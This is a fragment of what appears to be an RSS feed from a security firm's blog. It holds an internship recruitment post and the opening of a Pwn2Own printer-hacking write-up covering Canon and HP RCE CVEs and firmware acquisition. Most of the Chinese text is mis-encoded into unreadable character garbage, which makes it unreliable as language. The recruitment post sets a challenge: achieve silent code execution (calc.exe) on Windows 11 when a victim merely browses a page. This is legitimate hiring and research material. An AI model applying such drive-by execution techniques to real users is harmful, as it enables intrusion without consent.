      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶
        &lt;ul&gt;
          &lt;li&gt;Â¶ÇÊûúÂ±Ö‰ΩèÈõôÂåóÂ§ñÂèØÂΩàÊÄßË™øÊï¥(‰ΩÜÈ†àÊØèÂÄãÁµÑÂà•Áµ±‰∏Ä)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏ÁîüÔºå‰∏îÂèØÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©&lt;/li&gt;
  &lt;li&gt;Ê≠§Â§ñ‰∏¶ÁÑ°ÂÖ∂‰ªñÊãõÂãüÈôêÂà∂ÔºåÊ≠∑Â±ÜÂØ¶ÁøíÁîüÂèØÈáçË§áÊáâÂæµ&lt;/li&gt;
  &lt;li&gt;Â∞çË≥áÊ†ºÊúâ‰ªª‰ΩïÁñëÊÖÆÔºåÊ≠°Ëøé‰æÜ‰ø°Ë©¢Âïè&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Web ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÈÄÜÂêëÂ∑•Á®ãÂèäÈô§ÈåØËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;ËÉΩÁúãÊáÇÁµÑÂêàË™ûË®Ä‰∏¶Áû≠Ëß£Âü∫Êú¨ Debugger ‰ΩøÁî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;È†àÁü•ÈÅì Stack overflow„ÄÅROP Á≠âÁõ∏ÈóúÂà©Áî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ Scripting Language ÈñãÁôºËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;Python„ÄÅRuby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂàÜÊûêÂ§ßÂûã Open Source Â∞àÊ°àËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;‰ª• C/C++ ÁÇ∫‰∏ª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Á§é‰ΩúÊ•≠Á≥ªÁµ±Áü•Ë≠ò
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÁü•ÈÅì Virtual Address Ëàá Physical Address ÁöÑÊ¶ÇÂøµ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;Áü•ÈÅìÊÄéÊ®£ÂØ´ÁöÑÁ®ãÂºèÁ¢ºÊúÉÊúâÂïèÈ°å
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;‚Ä¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;Ê®ÇÊñºÂàÜ‰∫´ÊäÄË°ì
        &lt;ul&gt;
          &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅWrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÊúâÂØ´ÈÅé 1-day Âà©Áî®Á®ãÂºè&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ PortSwigger Web Security Academy ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËÄÉÈÄ£ÁµêÔºöhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúÔºåÂåÖÂê´ Unix-like Âíå Windows ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂ∏∏Ë¶ãÊàñÂÖßÂª∫Á≥ªÁµ±Êåá‰ª§Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApacheÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinuxÔºâÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôËøΩÊ†πÁ©∂Êü¢ÁöÑÁ≤æÁ•û„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day exploit„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∫åÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÁ≠îÊ°à
    &lt;ul&gt;
      &lt;li&gt;È°åÁõÆ 1ÔºöË´ãÊèêÂá∫‰∏âÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2021 ~ 2023 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Á∞°Ëø∞Ë™™ÊòéÂêÑÂÄãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇ&lt;/li&gt;
      &lt;li&gt;È°åÁõÆ 2ÔºöÂØ¶ÁøíÊúüÈñìÊÉ≥Ë¶ÅÁ†îÁ©∂ÁöÑ‰∏ªÈ°åÔºåË´ãÊèêÂá∫‰∏âÂÄãÂèØËÉΩÈÅ∏ÊìáÁöÑÊòéÁ¢∫‰∏ªÈ°åÔºå‰∏¶Á∞°ÂñÆË™™ÊòéÊèêÂá∫ÁöÑÁêÜÁî±ÊàñÊÉ≥ÂÆåÊàêÁöÑÂÖßÂÆπÔºå‰æãÂ¶ÇÔºö
        &lt;ul&gt;
          &lt;li&gt;Á†îÁ©∂‚óØ‚óØÈñãÊ∫êËªüÈ´îÔºåÊâæÂà∞ÂèØ RCE ÁöÑÈáçÂ§ßÈ¢®Èö™Âº±Èªû„ÄÇ&lt;/li&gt;
          &lt;li&gt;Á†îÁ©∂ AD CS ÁöÑÊîªÊìäÊâãÊ≥ïÔºåÂòóË©¶ÊåñÊéòÊñ∞ÁöÑÊîªÊìäÂèØËÉΩÊÄßÊàñÂêëÈáè„ÄÇ&lt;/li&gt;
          &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑË∑ØÁî±Âô®ÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöAA-123 Ë∑ØÁî±Âô®„ÄÅBB-456 ÁÑ°Á∑öË∑ØÁî±Âô®„ÄÇ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;È°åÁõÆ 3ÔºàÊáâÂæµ Binary ÁµÑÈúÄÂõûÁ≠îÔºâÔºöË©≤&lt;a href=&quot;/assets/files/recruit/binary/2024_Intern_Challenge.py&quot;&gt;Á®ãÂºè&lt;/a&gt;ÁÇ∫‰∏ÄÂÄã Local ServerÔºåÂèØÈÄèÈÅéÁÄèË¶ΩÁ∂≤È†ÅËàá‰πã‰∫íÂãïÔºåË©≤ Server Ë∑ëÂú® Windows 11 ÁöÑÈõªËÖ¶‰∏ä„ÄÇ
        &lt;ul&gt;
          &lt;li&gt;Ë´ãÂàÜÊûê‰∏äËø∞ÊâÄÊèê‰æõÁöÑ ServerÔºå‰∏¶Âà©Áî®ÂÖ∂‰∏≠ÁöÑÂäüËÉΩÔºåËÆì‰ΩøÁî®ËÄÖÁÄèË¶ΩÁ∂≤È†ÅÂæåÔºåÂèØÁõ¥Êé•Âú® Windows 11 ‰∏äË∑≥Âá∫ calc.exeÔºåÂè¶Â§ñ‰πüË´ãÁõ°ÈáèÊªøË∂≥‰∏ãÂàóÊ¢ù‰ª∂
            &lt;ul&gt;
              &lt;li&gt;‰∏çÂèØË∑≥&lt;strong&gt;‰ªª‰Ωï&lt;/strong&gt;Ë≠¶ÂëäË¶ñÁ™ó„ÄÇ&lt;/li&gt;
              &lt;li&gt;‰ΩøÁî®ËÄÖÂè™Ë¶ÅÁÄèË¶ΩÁ∂≤È†ÅÂç≥ÂèØËß∏Áôº‰∏çÊúÉÊúâÈ°çÂ§ñÊìç‰Ωú„ÄÇ&lt;/li&gt;
              &lt;li&gt;ÁÄèË¶ΩÂô®ÈôêÂà∂ÁÇ∫ Chrome ÊàñÊòØ MS Edge&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Ë´ãÂãôÂøÖÂØ´‰∏ãËß£È°åÈÅéÁ®ãÔºå‰∏¶‰∫§ write-upÔºåË´ãÁõ°‰Ω†ÊâÄËÉΩ‰æÜËß£È°åÔºåÂç≥‰ΩøÊúÄÂæåÊ≤íÊúâÊàêÂäüÔºå‰πüË´ãÂØ´‰∏ãÊÇ®ÊâÄÂòóË©¶ÈÅéÁöÑÊñπÊ≥ïÂèäÊÄùË∑ØÔºåÊú¨Ê∏¨È©óÂ∞áÊúÉ‰ª• write-up ÁÇ∫‰∏ªË¶Å‰æùÊìö„ÄÇ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êú¨ÈöéÊÆµÊî∂‰ª∂Êà™Ê≠¢ÊôÇÈñìÁÇ∫ &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt;ÔºåÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÈ°åÁõÆÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊàëÂÄëÊúÉÂú® 10 ÂÄã&lt;strong&gt;Â∑•‰ΩúÂ§©&lt;/strong&gt;ÂÖßÂõûË¶Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;
&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 30~120 ÂàÜÈêòÔºà‰æùÁÖßÁµÑÂà•ÈúÄÊ±ÇËÄåÂÆöÔºåÊúÉÂè¶Ë°åÈÄöÁü•ÔºâÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/01/05 - 2024/01/28 ÂÖ¨ÈñãÊãõÂãüÔºåÊõ∏ÂØ©Êà™Ê≠¢&lt;/li&gt;
  &lt;li&gt;2024/01/29 - 2024/02/22 Èù¢Ë©¶&lt;/li&gt;
  &lt;li&gt;2024/02/26 ÂâçÂõûÊáâÁµêÊûúÔºåÊó©Èù¢Ë©¶ÊúÉÊó©Êî∂Âà∞ÁµêÊûú&lt;/li&gt;
  &lt;li&gt;2024/03/04 Á¨¨‰∫îÂ±ÜÂØ¶ÁøíË®àÁï´ÊñºÁï∂ÈÄ±ÈñãÂßã&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;È°åÁõÆÁ≠îÊ°à&lt;/strong&gt;‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº &lt;strong&gt;2024/01/28 23:59&lt;/strong&gt; ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Web ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®‰∏âÈ†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/01/05/5nd-internship-program-recruit</guid>
                <pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Âª∂Á∫å&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;‰πãÂâç&lt;/a&gt;ÁöÑÁ†îÁ©∂ÔºåÂéªÂπ¥ÊàëÂÄë‰πüÂú® Canon ÁöÑÂÖ∂‰ªñÂûãËôü‰∏≠ÔºåÊâæÂà∞‰∫Ü Pre-auth RCE ÊºèÊ¥û &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;)ÔºåÂêåÊôÇ HP ÁöÑÂç∞Ë°®Ê©ü‰πüÊúâÊâæÂà∞ Pre-auth RCE ÁöÑÊºèÊ¥ûÔºåÁÑ∂ËÄåÊúÄÁµÇËàáÂÖ∂‰ªñÈöä‰ºçÊíûÊ¥û„ÄÇÊàëÂÄëÂ∞áÂú®Êú¨ÊñáË¨õËø∞ÊàëÂÄëÂú® Pwn2own Toronto ‰∏≠ÊâÄ‰ΩøÁî®ÁöÑ Canon Âèä &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP ÊºèÊ¥û&lt;/a&gt;ÁöÑÁ¥∞ÁØÄÔºå‰ª•ÂèäÊàëÂÄëÁöÑÂà©Áî®ÊñπÂºè„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;Ëàá 2021 Âπ¥Áõ∏ÂêåÔºåÂèØÂèÉËÄÉ&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;ÂâçËø∞&lt;/a&gt;ÈÉ®ÂàÜÔºåÊú¨Ê¨°ÁâàÊú¨ÁÇ∫ v11.04 „ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;

&lt;p&gt;Firmware Êú¨Ë∫´ÂèØ‰ª•Âæû HP ÁöÑ Firmware &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;Á∂≤Á´ô&lt;/a&gt; ‰∏≠ÂèñÂæóÔºå‰ΩÜËàá 2021 Âπ¥‰∏çÂêåÔºå‰∏¶&lt;strong&gt;ÁÑ°Ê≥ï&lt;/strong&gt;Áõ¥Êé•Áî® binwalk Ëß£Âá∫ÔºåÈÄôÈÇäÁöÑ Firmware ÊòØÈÄèÈÅé AES Âä†ÂØÜÁöÑÔºåÂæûÁèæÊúâÁöÑË≥áË®ä‰∏≠‰∏çÂ§™Â•ΩÁõ¥Êé•Ëß£Èñã„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÈÄôÈÇäËµ∑ÂàùÊÉ≥Ê≥ïÊòØÊâæÁõ∏ÂêåÁ≥ªÂàóÁöÑ Fimware ÁúãÁúãÊòØÂê¶ÊúâÊú™Âä†ÂØÜÁâàÊú¨ÔºåÁÑ∂ËÄå HP ÂÆòÊñπÁöÑ Firmware ‰∏≠Ôºå‰∏¶Ê≤íÊúâÁ¨¶ÂêàÊ¢ù‰ª∂ÁöÑ FirmwareÔºåÂéüÊú¨ÊâìÁÆóÊãÜÂç∞Ë°®Ê©üÊÉ≥Ëæ¶Ê≥ï Dump firmwareÔºå‰ΩÜÊàëÂÄëÂæå‰æÜÂú® Google ÁöÑÈÅéÁ®ã‰∏≠ÔºåÊâæÂà∞‰∫ÜËàäÁâàÁöÑ mirror Á´ôÔºåËÄåË©≤Á∂≤Á´ôÊúâÈñã index ofÔºåÊàëÂÄëÂèØ‰ª•Âæû‰∏≠Áç≤ÂæóÊâÄÊúâÂú® mirror Á∂≤Á´ô‰∏≠ÁöÑ Firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÈÄôÈÇäÂïèÈ°åÊòØË©≤ Mirror Á∂≤Á´ôÂè™Êúâ mirror Âà∞ 2016 ‰∏¶Ê≤íÊúâÊúÄÊñ∞ÁâàÊú¨ÁöÑË≥áË®äÔºå‰∏çÈÅéÂæå‰æÜÂèØ‰ª•ÂæûÁ∂≤Á´ôË≥áË®ä‰∏≠ÔºåÁç≤ÂæóÂÆòÊñπÁöÑÁõÆÈåÑÁµêÊßãÔºåÂæûËÄåÂèñÂæóÁõ∏ÂêåÁ≥ªÂàóÁöÑ‰ΩÜÊ≤íÊúâÂä†ÂØÜÁöÑ Firmware„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

